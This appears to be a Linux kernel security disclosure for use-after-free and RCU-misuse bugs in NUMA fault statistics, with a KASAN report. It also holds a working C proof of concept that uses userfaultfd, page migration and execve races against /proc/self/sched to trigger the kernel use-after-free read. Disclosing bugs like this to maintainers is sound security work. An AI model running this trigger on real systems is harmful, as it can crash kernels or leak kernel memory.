@@ -1,0 +1,265 @@
+/*
+On NUMA systems, the Linux fair scheduler tracks information related to NUMA
+faults in task_struct::numa_faults and task_struct::numa_group. Both of these
+have broken object lifetimes.
+
+Since commit 82727018b0d3 ("sched/numa: Call task_numa_free() from do_execve()",
+first in v3.13), ->numa_faults is freed not only when the last reference to the
+task_struct is gone, but also after successful execve(). However,
+show_numa_stats() (reachable through /proc/$pid/sched) locklessly reads data
+from ->numa_faults (use-after-free read) and prints it to a userspace buffer.
+
+To test this, I used a QEMU VM with the following NUMA configuration:
+
+    -m 8192 -smp cores=4 -numa node,nodeid=0 -numa node,nodeid=1
+
+Test code is attached; it takes a while before it triggers the bug since the
+race window is pretty small.
+
+KASAN report:
+============================
+[  909.461282] ==================================================================
+[  909.464502] BUG: KASAN: use-after-free in show_numa_stats+0x99/0x160
+[  909.465250] Read of size 8 at addr ffff8880ac8f8f00 by task numa_uaf/18471
+
+[  909.466167] CPU: 0 PID: 18471 Comm: numa_uaf Not tainted 5.2.0-rc7 #443
+[  909.466877] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.12.0-1 04/01/2014
+[  909.467751] Call Trace:
+[  909.468072]  dump_stack+0x7c/0xbb
+[  909.468413]  ? show_numa_stats+0x99/0x160
+[  909.468879]  print_address_description+0x6e/0x2a0
+[  909.469419]  ? show_numa_stats+0x99/0x160
+[  909.469828]  ? show_numa_stats+0x99/0x160
+[  909.470292]  __kasan_report+0x149/0x18d
+[  909.470683]  ? show_numa_stats+0x99/0x160
+[  909.471137]  kasan_report+0xe/0x20
+[  909.471533]  show_numa_stats+0x99/0x160
+[  909.471988]  proc_sched_show_task+0x6ae/0x1e60
+[  909.472467]  sched_show+0x6a/0xa0
+[  909.472836]  seq_read+0x197/0x690
+[  909.473264]  vfs_read+0xb2/0x1b0
+[  909.473616]  ksys_pread64+0x74/0x90
+[  909.474034]  do_syscall_64+0x5d/0x260
+[  909.474975]  entry_SYSCALL_64_after_hwframe+0x49/0xbe
+[  909.475512] RIP: 0033:0x7f6f57742987
+[  909.475878] Code: 35 39 a4 09 00 48 8d 3d d1 a4 09 00 e8 52 77 f4 ff 66 90 48 8d 05 79 7d 0d 00 49 89 ca 8b 00 85 c0 75 10 b8 11 00 00 00 0f 05 <48> 3d 00 f0 ff ff 77 59 c3 41 55 49 89 cd 41 54 49 89 d4 55 48 89
+[  909.477905] RSP: 002b:00005565fc10d108 EFLAGS: 00000246 ORIG_RAX: 0000000000000011
+[  909.478684] RAX: ffffffffffffffda RBX: 0000000000000000 RCX: 00007f6f57742987
+[  909.479393] RDX: 0000000000001000 RSI: 00005565fc10d120 RDI: 0000000000000005
+[  909.480254] RBP: 00005565fc10e130 R08: 00007f6f57657740 R09: 00007f6f57657740
+[  909.481037] R10: 0000000000000000 R11: 0000000000000246 R12: 00005565fbf0b1f0
+[  909.481821] R13: 00007ffe60338770 R14: 0000000000000000 R15: 0000000000000000
+
+[  909.482744] Allocated by task 18469:
+[  909.483135]  save_stack+0x19/0x80
+[  909.483475]  __kasan_kmalloc.constprop.3+0xa0/0xd0
+[  909.483957]  task_numa_fault+0xff2/0x1d30
+[  909.484414]  __handle_mm_fault+0x94f/0x1320
+[  909.484887]  handle_mm_fault+0x7e/0x100
+[  909.485323]  __do_page_fault+0x2bb/0x610
+[  909.485722]  async_page_fault+0x1e/0x30
+
+[  909.486355] Freed by task 18469:
+[  909.486687]  save_stack+0x19/0x80
+[  909.487027]  __kasan_slab_free+0x12e/0x180
+[  909.487497]  kfree+0xd8/0x290
+[  909.487805]  __do_execve_file.isra.41+0xf1e/0x1140
+[  909.488316]  __x64_sys_execve+0x4f/0x60
+[  909.488706]  do_syscall_64+0x5d/0x260
+[  909.489144]  entry_SYSCALL_64_after_hwframe+0x49/0xbe
+
+[  909.490121] The buggy address belongs to the object at ffff8880ac8f8f00
+                which belongs to the cache kmalloc-128 of size 128
+[  909.491564] The buggy address is located 0 bytes inside of
+                128-byte region [ffff8880ac8f8f00, ffff8880ac8f8f80)
+[  909.492919] The buggy address belongs to the page:
+[  909.493445] page:ffffea0002b23e00 refcount:1 mapcount:0 mapping:ffff8880b7003500 index:0xffff8880ac8f8d80
+[  909.494419] flags: 0x1fffc0000000200(slab)
+[  909.494836] raw: 01fffc0000000200 ffffea0002cec780 0000000900000009 ffff8880b7003500
+[  909.495633] raw: ffff8880ac8f8d80 0000000080150011 00000001ffffffff 0000000000000000
+[  909.496451] page dumped because: kasan: bad access detected
+
+[  909.497291] Memory state around the buggy address:
+[  909.497775]  ffff8880ac8f8e00: fc fc fc fc fc fc fc fc fb fb fb fb fb fb fb fb
+[  909.498546]  ffff8880ac8f8e80: fb fb fb fb fb fb fb fb fc fc fc fc fc fc fc fc
+[  909.499319] >ffff8880ac8f8f00: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
+[  909.500034]                    ^
+[  909.500429]  ffff8880ac8f8f80: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
+[  909.501150]  ffff8880ac8f9000: ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff
+[  909.501942] ==================================================================
+[  909.502712] Disabling lock debugging due to kernel taint
+============================
+
+
+->numa_group is a refcounted reference with RCU semantics, but the RCU helpers
+are used inconsistently. In particular, show_numa_stats() reads from
+p->numa_group->faults with no protection against concurrent updates.
+
+There are also various other places across the scheduler that use ->numa_group
+without proper protection; e.g. as far as I can tell,
+sched_tick_remote()->task_tick_fair()->task_tick_numa()->task_scan_start()
+reads from p->numa_group protected only by the implicit read-side critical
+section that spinlocks currently imply by disabling preemption, and with no
+protection against the pointer unexpectedly becoming NULL.
+
+
+I am going to send suggested fixes in a minute, but I think the approach for
+->numa_group might be a bit controversial. The approach I'm taking is:
+
+ - For ->numa_faults, just wipe the statistics instead of freeing them.
+ - For ->numa_group, use proper RCU accessors everywhere.
+
+Annoyingly, if one of the RCU accessors detects a problem (with
+CONFIG_PROVE_LOCKING=y), it uses printk, and if the wrong runqueue lock is held
+at that point, a deadlock might happen, which isn't great. To avoid that, the
+second patch adds an ugly hack in printk that detects potential runqueue
+deadlocks if lockdep is on. I'm not sure how you all are going to feel about
+that one - maybe it's better to just leave it out, or do something different
+there? I don't know...
+
+I'm sending the suggested patches off-list for now; if you want me to resend
+them publicly, just say so.
+*/
+
+#define _GNU_SOURCE
+#include <errno.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <string.h>
+#include <stdio.h>
+#include <numaif.h>
+#include <sched.h>
+#include <err.h>
+#include <time.h>
+#include <fcntl.h>
+#include <signal.h>
+#include <sys/prctl.h>
+#include <sys/mman.h>
+#include <sys/wait.h>
+#include <sys/ioctl.h>
+#include <sys/uio.h>
+#include <sys/syscall.h>
+#include <linux/userfaultfd.h>
+
+int sched_fd;
+
+int get_scan_seq(void) {
+  char buf[0x1000];
+  ssize_t buflen = pread(sched_fd, buf, sizeof(buf)-1, 0);
+  if (buflen == -1) err(1, "read sched");
+  buf[buflen] = '\0';
+  char *p = strstr(buf, "numa_scan_seq");
+  if (!p) errx(1, "no numa_scan_seq");
+  *strchrnul(p, '\n') = '\0';
+  p = strpbrk(p, "0123456789");
+  if (!p) errx(1, "no numa_scan_seq");
+  return atoi(p);
+}
+
+void reexec(char *arg0) {
+  char *argv[] = {arg0, NULL};
+  execvp("/proc/self/exe", argv);
+  err(1, "reexec");
+}
+
+volatile int uaf_child_ready = 0;
+static int sfd_uaf(void *fd_) {
+  int fd = (int)(long)fd_;
+/*
+  prctl(PR_SET_PDEATHSIG, SIGKILL);
+  if (getppid() == 1) raise(SIGKILL);
+*/
+
+  while (1) {
+    char buf[0x1000];
+    ssize_t res = pread(fd, buf, sizeof(buf)-1, 0);
+    if (res == -1) {
+      if (errno == ESRCH) _exit(0);
+      err(1, "pread");
+    }
+    buf[res] = '\0';
+    puts(buf);
+    uaf_child_ready = 1;
+  }
+}
+
+int main(int argc, char **argv) {
+  if (strcmp(argv[0], "die") == 0) {
+    _exit(0);
+  }
+  sched_fd = open("/proc/self/sched", O_RDONLY|O_CLOEXEC);
+  if (sched_fd == -1) err(1, "open sched");
+
+  // allocate two pages at the lowest possible virtual address so that the first periodic memory fault is scheduled on the first page
+  char *page = mmap((void*)0x1000, 0x2000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0);
+  if (page == MAP_FAILED) err(1, "mmap");
+  *page = 'a';
+
+  // handle the second page with uffd
+  int ufd = syscall(__NR_userfaultfd, 0);
+  if (ufd == -1) err(1, "userfaultfd");
+  struct uffdio_api api = { .api = UFFD_API, .features = 0 };
+  if (ioctl(ufd, UFFDIO_API, &api)) err(1, "uffdio_api");
+  struct uffdio_register reg = {
+    .mode = UFFDIO_REGISTER_MODE_MISSING,
+    .range = { .start = (__u64)page+0x1000, .len = 0x1000 }
+  };
+  if (ioctl(ufd, UFFDIO_REGISTER, &reg))
+    err(1, "uffdio_register");
+
+  // make sure that the page is on the CPU-less NUMA node
+  unsigned long old_nodes = 0x1;
+  unsigned long new_nodes = 0x2;
+  if (migrate_pages(0, sizeof(unsigned long), &old_nodes, &new_nodes)) err(1, "migrate_pages");
+
+  // trigger userfault in child
+  pid_t uffd_child = fork();
+  if (uffd_child == -1) err(1, "fork");
+  if (uffd_child == 0) {
+    prctl(PR_SET_PDEATHSIG, SIGKILL);
+    struct iovec iov = { .iov_base = (void*)0x1fff, .iov_len = 2 };
+    process_vm_readv(getppid(), &iov, 1, &iov, 1, 0);
+    err(1, "process_vm_readv returned");
+  }
+  sleep(1);
+
+  int ini_seq = get_scan_seq();
+  printf("initial scan_seq: %d\n", ini_seq);
+  if (ini_seq) reexec("m");
+
+  // wait for a migration
+  time_t start_time = time(NULL);
+  while (1) {
+    if (time(NULL) > start_time + 30) {
+      puts("no migration detected!");
+      reexec("m");
+    }
+    int cur_seq = get_scan_seq();
+    if (cur_seq != 0) {
+      printf("new scan_seq: %d\n", cur_seq);
+      goto migration_done;
+    }
+  }
+
+migration_done:
+  printf("migration done after %d seconds\n", (int)(time(NULL)-start_time));
+  while (1) {
+    pid_t pid = fork();
+    if (pid == -1) err(1, "fork");
+    if (pid == 0) {
+      static char uaf_stack[1024*1024];
+      static char uaf_stack2[1024*1024];
+      int sfd = open("/proc/self/sched", O_RDONLY);
+      if (sfd == -1) err(1, "open sched");
+      pid_t uaf_child = clone(sfd_uaf, uaf_stack+sizeof(uaf_stack), CLONE_FILES|CLONE_VM, (void*)(long)sfd);
+      if (uaf_child == -1) err(1, "clone uaf_child");
+      uaf_child = clone(sfd_uaf, uaf_stack2+sizeof(uaf_stack2), CLONE_FILES|CLONE_VM, (void*)(long)sfd);
+      if (uaf_child == -1) err(1, "clone uaf_child");
+      while (!uaf_child_ready) __builtin_ia32_pause();
+      *(volatile char *)page = 'b';
+      reexec("die");
+    }
+    int status;
+    if (wait(&status) != pid) err(1, "wait");
+  }
+}
